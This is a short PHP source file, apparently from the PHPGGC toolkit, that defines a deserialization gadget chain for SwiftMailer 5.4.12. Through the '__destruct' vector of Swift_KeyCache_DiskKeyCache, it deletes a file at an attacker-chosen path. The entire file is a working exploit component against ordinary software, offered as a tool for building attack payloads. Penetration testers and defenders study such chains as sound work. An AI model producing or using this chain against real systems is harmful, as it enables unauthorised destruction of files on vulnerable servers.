<?php

namespace GadgetChain\SwiftMailer;

class FD3 extends \PHPGGC\GadgetChain\FileDelete
{
    public static $version = '5.4.12';
    public static $vector = '__destruct';
    public static $author = 'CyanM0un';

    public function generate(array $parameters)
    {
        return new \Swift_KeyCache_DiskKeyCache($parameters['remote_path']);
    }
}
